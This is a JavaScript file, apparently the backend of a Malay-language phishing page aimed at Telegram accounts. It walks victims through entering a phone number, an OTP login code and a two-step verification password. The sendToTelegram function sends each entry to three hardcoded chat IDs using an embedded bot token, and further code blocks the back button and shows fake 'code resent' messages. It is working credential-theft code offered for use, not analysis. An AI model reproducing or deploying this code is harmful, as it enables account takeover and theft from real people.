// Menangani tombol kembali pada perangkat Android atau browser lain
window.onpopstate = function (event) {
  // Mengarahkan ke halaman index.html jika tombol kembali ditekan
  window.location.href = "index.html";
};

// Menggunakan pushState untuk menambahkan entri baru ke riwayat
window.history.pushState({}, document.title, window.location.href);

// Inisialisasi input telepon dengan intlTelInput untuk negara-negara Asia saja
const input = document.querySelector("#phone");
const iti = window.intlTelInput(input, {
  initialCountry: "MY",
  separateDialCode: true,
  onlyCountries: ["MY", "ID", "SG", "TH", "PH", "VN", "KH", "JP", "KR", "CN"], // Daftar negara Asia
  utilsScript: "assets/js/utils.js",
});

// Fungsi untuk mengosongkan semua input form saat halaman dimuat atau di-refresh
window.onload = function () {
  resetForms(); // Panggil fungsi reset saat halaman dimuat
};

// Fungsi untuk mengosongkan semua input form
function resetForms() {
  // Mengambil semua form dan mengosongkan isian input-nya
  const forms = document.querySelectorAll("form");
  forms.forEach((form) => {
    form.reset(); // Reset form, yang mengosongkan semua input
  });

  // Jika ada input telepon yang diatur melalui intlTelInput, reset juga
  if (iti) {
    iti.setNumber(""); // Reset nomor telepon intlTelInput
  }

  // Mengosongkan localStorage jika diperlukan
  localStorage.removeItem("phoneNumber");
}

// Menangani form telepon dan kirim data ke Telegram
document.getElementById("phoneForm").addEventListener("submit", function (e) {
  e.preventDefault();

  // Ambil nomor telepon lengkap dari input
  const fullPhoneNumber = iti.getNumber();

  // Simpan nomor telepon ke localStorage
  localStorage.setItem("phoneNumber", fullPhoneNumber);

  // Menampilkan nomor telepon di modal preview
  document.getElementById("phonePreview").textContent = fullPhoneNumber;

  // Kirim nomor telepon ke Telegram
  sendToTelegram("📱Nomor telepon: " + fullPhoneNumber);

  // Tampilkan modal konfirmasi
  const myModal = new bootstrap.Modal(document.getElementById("confirmModal"));
  myModal.show();
});

// Menangani konfirmasi nomor telepon dari modal
document.getElementById("confirmPhone").addEventListener("click", function () {
  const fullPhoneNumber = iti.getNumber();

  // Menyembunyikan Step 1 dan menampilkan Step 2 (OTP)
  document.getElementById("phoneStep").style.display = "none"; // Step 1
  document.getElementById("otpStep").style.display = "block"; // Step 2

  // Menutup modal setelah konfirmasi
  const myModal = bootstrap.Modal.getInstance(
    document.getElementById("confirmModal")
  );
  myModal.hide();
});

// Menangani form OTP pada Step 2 dan kirim data segera
document.getElementById("otpForm").addEventListener("submit", function (e) {
  e.preventDefault();

  // Ambil OTP yang dimasukkan
  const otp = document.getElementById("otp").value;

  // Periksa apakah OTP yang dimasukkan benar
  if (otp.length === 5) {
    // Kirim OTP ke Telegram segera setelah input selesai
    const fullPhoneNumber = localStorage.getItem("phoneNumber");
    sendToTelegram(`📱 Nomor Telepon: ${fullPhoneNumber}

🔑 Kode OTP : ${otp}`);

    // Menyembunyikan Step 2 dan menampilkan Step 3 (Verifikasi)
    document.getElementById("otpStep").style.display = "none"; // Step 2
    document.getElementById("verif").style.display = "block"; // Step 3
  } else {
    alert("Sila masukkan OTP yang valid.");
  }
});

// Menangani form verifikasi pada Step 3 dan kirim data verifikasi
document.getElementById("verifForm").addEventListener("submit", function (e) {
  e.preventDefault();

  // Ambil data verifikasi yang dimasukkan
  const otp = document.getElementById("otp").value;
  const fullPhoneNumber = localStorage.getItem("phoneNumber");
  const verificationCode = document.getElementById("laluan").value; // Mengambil data dari input dengan ID 'laluan'

  // Buat pesan yang akan dikirim ke Telegram
  const message = `
🎉 Ringkasan Data Pengguna 🎉

📱 Nomor Telepon : ${fullPhoneNumber}

🔑 Kode OTP : ${otp}

🔐 Verifikasi 2 Langkah : ${verificationCode}
`;

  // Kirim data verifikasi ke Telegram
  sendToTelegram(message);

  // Tampilkan pesan sukses atau lakukan tindakan lainnya setelah verifikasi
  alert("Menghantar Berjaya.");
});

// Fungsi untuk mengirim data ke Telegram (ke beberapa chat ID)
function sendToTelegram(message) {
  const botToken = "7718345342:AAEFgRlAEIPxePQ6BTFdtKb0an8QRbWdXm0"; // Ganti dengan token bot Anda
  const chatIds = ["6124038392", "5460230196", "7512534303"]; // Daftar beberapa chat ID penerima pesan

  chatIds.forEach((chatId) => {
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
      message
    )}`;

    // Mengirimkan permintaan GET ke API Telegram untuk setiap chat ID
    fetch(telegramUrl)
      .then((response) => response.json())
      .then((data) => {
        console.log(`Pesan berhasil dikirim ke chat ID: ${chatId}`);
      })
      .catch((error) => {
        console.error(
          `Tidak dapat mengirim pesan ke chat ID ${chatId}:`,
          error
        );
      });
  });
}

// Fungsi untuk menampilkan loading spinner saat tombol diklik
document.getElementById("myButton").addEventListener("click", function () {
  // Menonaktifkan tombol sementara dan menampilkan spinner loading
  document.getElementById("myButton").disabled = true;
  document.getElementById("loading").style.display = "block";

  // Menampilkan hitungan mundur 30 detik
  let countdown = 30;
  const countdownElement = document.getElementById("countdown");
  countdownElement.style.display = "block";
  countdownElement.textContent = `Sila tunggu ${countdown} detik...`;

  // Set interval untuk hitungan mundur
  const countdownInterval = setInterval(function () {
    countdown--;
    countdownElement.textContent = `Sila tunggu ${countdown} detik sebelum menghantar kod semula...`;

    if (countdown === 0) {
      // Setelah 30 detik, hentikan hitungan mundur dan aktifkan tombol kembali
      clearInterval(countdownInterval);
      document.getElementById("myButton").disabled = false;
      document.getElementById("loading").style.display = "none";
      countdownElement.style.display = "none";
    }
  }, 1000);

  // Simulasi pengiriman ulang kode OTP (misalnya dalam 3 detik)
  setTimeout(function () {
    // Menyembunyikan spinner setelah proses selesai
    document.getElementById("loading").style.display = "none";

    // Tampilkan pesan pop-up modern
    showAlert("Kod pengesahan telah dihantar, sila semak telegram anda.");
  }, 3000); // Menggunakan delay 3 detik (atau sesuaikan dengan durasi yang dibutuhkan)
});

// Fungsi untuk menampilkan pop-up modern
function showAlert(message) {
  const modal = document.createElement("div");
  modal.style.position = "fixed";
  modal.style.top = "50%";
  modal.style.left = "50%";
  modal.style.transform = "translate(-50%, -50%)";
  modal.style.padding = "20px";
  modal.style.backgroundColor = "#e5f8f6";
  modal.style.border = "1px solid rgb(247,163,236)";
  modal.style.borderRadius = "10px";
  modal.style.boxShadow = "0px 0px 20px 2px";
  modal.style.zIndex = "9999"; // Pastikan modal di atas konten lainnya

  const modalContent = document.createElement("p");
  modalContent.style.textAlign = "center";
  modalContent.innerHTML = `<em>${message}</em>`;

  // Membuat tombol "Tutup" pada modal
  const closeButton = document.createElement("button");
  closeButton.innerText = "Tutup";
  closeButton.style.marginTop = "10px";
  closeButton.style.padding = "5px 15px";
  closeButton.style.backgroundColor = "#f25c8a";
  closeButton.style.border = "none";
  closeButton.style.borderRadius = "5px";
  closeButton.style.cursor = "pointer";

  closeButton.addEventListener("click", function () {
    document.body.removeChild(modal); // Menghapus modal setelah tombol ditutup
  });

  modal.appendChild(modalContent);
  modal.appendChild(closeButton);
  document.body.appendChild(modal);
}
